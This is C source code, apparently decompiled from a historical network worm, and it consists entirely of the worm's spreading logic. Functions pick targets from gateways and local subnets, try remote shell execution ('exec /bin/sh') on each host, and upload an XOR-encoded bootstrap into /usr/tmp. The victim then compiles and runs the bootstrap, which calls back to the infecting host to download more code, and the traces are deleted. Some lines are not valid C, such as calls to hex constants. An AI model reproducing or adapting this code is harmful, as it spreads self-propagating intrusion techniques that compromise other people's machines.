

hg()
{
	int	f8;

	rt_init();
	for (f8 = 0; f8 < ngateways; f8++) {
		f4 = h_addr2host(gateways[f8], 1);
		if (s_1638(f4))
			return 1;	/* XXX */
	}
	return 0;
}


ha()
{
	struct	host *f4;
	int	f8;
	int	fc;
	int	f10;
	char	f1a0[128];

	if (ngateways < 1)
		rt_init();
	fc = 0;
	for (f8 = 0; f8 < ngateways; f8++) {
		f4 = h_addr2host(gateways[f8], 1);
		for (f10 = 0; f10 < 6; f10++) {
			if (f4->o30[f10].s_addr == INADDR_ANY)
				continue;
			if (0x1586(f4->o30[f10]) != 0) {
				f1a0[fc] = f4->o30[f10];
				fc++;
			}
		}
	}
	permute(&f1a0, fc, 4);
	for (f8 = 0; f8 < fc; f8++) {
		f1a4 = ~netmaskfor(f1a0[f8]);
		if (s_12fc(f1a0[f8] & ~f1a4))
			return 1;
	}
	return 0;
}

hl()
{
	extern	struct host *me;
	int	f4;
	u_long	f8;

	for (f4 = 0; f4 < 6; f4++) {
		if (me->o30[f4].s_addr == INADDR_ANY)
			break;
		f8 = netmaskfor(me->o30[f4]);
		if (s_12fc(me->o30[f4].s_addr & ~f8))
			return 1;
	}
	return 0;
}

int
hi()
{
	struct	host *f4;

	for (f4 = hosts; f4 != 0; f4 = f4->o4c) {
		if ((f4->o48 & bit(3)) && s_1638(f4))
			return 1;
	}
	return 0;
}

static
s_12fc(a4)
	u_long	a4;
{
	int	f4;
	int	fc;
	int	f10;
	u_int	f14;
	int	f18;
	int	f20;
	int	f28;
	int	f2c;

	fc = netmaskfor(a4);
	f10 = ~ntohl(fc);
	for (f18 = 0; f18 < nifs; f18++) {
		/*
		 * XXX fixed from original; bozo put 0 instead of f18 here!
		 */
		if ((ifs[f18].o10 & ifs[f18].o18) == a4)
			return 0;
	}
	f20 = 0;
	if (f10 == 0x00ffffff) {
		f2c = 4;
		for (f28 = 1; f28 < 0xff; f28++) {
			for (f14 = 1; f14 <= 8; f14++) {
				f202c[f20] = a4 | htonl((f14 << 16) | f28);
				f20++;
			}
		}
		permute(&f202c, f20, 4);
	} else {
		f2c = 4;
		for (f14 = 1; f14 < 0xff; f14++) {
			f202c[f20] = a4 | htonl(f14);
			f20++;
		}
		permute(&f202c, 12, 4);
		permute(&f2014, f20-6, 4);
	}
	if (f20 > 20)
		f20 = 20;
	for (f24 = 0; f24 < f20; f24++) {
		f4 = f202c[f24];
		f8 = h_addr2host(f4, 0);
		if (f8 != 0 && (f8->o48 & bit(1)))
			continue;
		if (f8 != 0 && (f8->o48 & bit(2)))
			continue;
		if (0x14c8(f4, f2c) == 0)
			continue;
		if (f8 == 0)
			f8 = h_addr2host(f4, 1);
		if (s_1638(f8) != 0)
			return 1;
	}
	return 0;
}

int
s_1638(a4)
	struct	host *a4;
{
	int	f4;
	int	f8;
	int	fc;

	if (a4 == me)
		return 0;
	if (a4->o48 & bit(1))
		return 0;
	if (a4->o48 & bit(2))
		return 0;
	if (a4->o30[0].s_addr != 0 && a4->o0[0] == 0)
		getaddrs(a4);
	if (a4->o30[0].s_addr == 0) {
		a4->o48 |= bit(2);
		return 0;
	}
	other_sleep(1);
	if (a4->o0[0] != 0 &&
	    s_21e0(a4->o0[0], &f4, &f8, XS("exec /bin/sh")) != 0) {
		fc = s_1776(a4, f4, f8);
		close(f4);
		close(f8);
		wait3(0, WNOHANG, 0);
		if (fc != 0)
			return fc;
	}
	if (s_25ec(a4, &f4, &f8) != 0) {
		fc = s_1776(a4, f4, f8);
		close(f4);
		close(f8);
		if (fc != 0)
			return fc;
	}
	if (s_28a8(a4) != 0)
		return 1;
	a4->o48 |= bit(2);
	return 0;
}

s_1776(a4, a8, ac)
	struct	host *a4;
	int	a8;
	int	ac;
{
	struct	object *f4;
	int	f244;
	int	f248;
	int	f24c;
	int	f250;

	f4 = getobjectbyname(XS("l1.c"));
	if (f4 == 0)
		return 0;
	if (makemagic(a4->name[0], &f250, &f244, &f248, &f24c) == 0)
		return 0;
	s_21be(ac, XS("PATH=/bin:/usr/bin:/usr/ucb"));
	s_21be(ac, XS("cd /usr/tmp"));
	f240 = random() % 0xffffff;
	sprintf(f236, XS("x%d.c"), f240);
	sprintf(f204, XS("echo gorch49;sed '/int zz;/q' > %s;echo gorch50\n"),
		f236);
	s_21be(ac, f204);
	s_2462(a8, XS("gorch49"), 10);
	xorbuf(f4->o8, f4->o4);
	f23c = write(ac, f4->o8, f4->o4);
	xorbuf(f4->o8, f4->o4, f23c);
	if (f23c != f4->o4) {
		close(f24c);
		return 0;
	}
	s_21be(ac, XS("int zz;\n\n"));
	s_2462(a8, XS("gorch50"), 30);
	sprintf(f204,
	   XS("cc -o x%d x%d.c;./x%d %s %d %d;rm -f x%d x%d.c;echo DONE\n"),
	   f240, f240, f240, inet_ntoa(a2in(f250)),
	   htons(f244), f248, f240, f240);
	s_21be(ac, f204);
	if (s_2462(a8, XS("DONE"), 100) == 0) {
		close(f24c);
		return 0;
	}
	waithit(a4, f250, f244, f248, f24c);
}
